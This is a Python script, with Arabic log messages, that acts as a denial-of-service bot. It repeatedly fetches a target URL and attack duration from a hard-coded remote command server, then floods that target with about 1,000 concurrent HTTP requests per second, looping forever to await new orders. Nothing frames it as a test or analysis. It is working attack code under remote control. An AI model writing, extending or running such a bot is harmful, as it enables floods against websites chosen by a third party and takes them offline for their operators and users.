import aiohttp
import asyncio
import time
import xml.etree.ElementTree as ET

MAX_REQUESTS_PER_SECOND = 1000

async def send_request(session, url):
    try:
        print(f"إرسال طلب إلى: {url}")
        async with session.get(url):
            print(f"تم إرسال الطلب إلى: {url}")
    except Exception as e:
        print(f"فشل إرسال الطلب إلى: {url} بسبب: {e}")

async def get_instructions():
    api_url = 'http://nrcf.medianewsonline.com/api/index.php'
    
    try:
        print(f"جاري الحصول على التعليمات من: {api_url}")
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url) as response:
                if response.status == 200:
                    print("تم استلام البيانات بنجاح")
                    xml_data = await response.text()
                    if xml_data:
                        try:
                            root = ET.fromstring(xml_data)
                            url = root.find('url').text
                            time_limit = int(root.find('time').text)
                            print(f"تم الحصول على URL: {url} ومدة الزمنية: {time_limit}")
                            return url, time_limit
                        except ET.ParseError as e:
                            print(f"خطأ في تحليل XML: {e}")
                            return None, None
                    else:
                        print("البيانات الفارغة تم استلامها.")
                        return None, None
                else:
                    print(f"فشل استلام البيانات: حالة الاستجابة {response.status}")
                    return None, None
    except Exception as e:
        print(f"حدث خطأ أثناء الاتصال بـ API: {e}")
        return None, None

async def send_requests_in_batch(url, duration):
    async with aiohttp.ClientSession() as session:
        start_time = time.time()
        end_time = start_time + duration
        print(f"بدء إرسال الطلبات إلى {url} لمدة {duration} ثانية.")

        while time.time() < end_time:
            tasks = [send_request(session, url) for _ in range(MAX_REQUESTS_PER_SECOND)]
            await asyncio.gather(*tasks)

            elapsed_time = time.time() - start_time
            requests_per_second = MAX_REQUESTS_PER_SECOND / elapsed_time

            print(f"تم إرسال {MAX_REQUESTS_PER_SECOND} طلبات في {elapsed_time:.2f} ثانية. معدل الطلبات: {requests_per_second:.2f} طلبات في الثانية.")

            if elapsed_time < 1:
                await asyncio.sleep(1 - elapsed_time)

async def main():
    while True:
        print("جاري الحصول على التعليمات...")
        url, duration = await get_instructions()

        if url and duration:
            print(f"تم العثور على URL: {url} ومدة الزمنية: {duration}")
            await send_requests_in_batch(url, duration)
        else:
            print("لم يتم العثور على تعليمات. الانتظار 10 ثوانٍ لإعادة المحاولة.")
            await asyncio.sleep(10)

if __name__ == "__main__":
    print("بدء البرنامج.")
    asyncio.run(main())
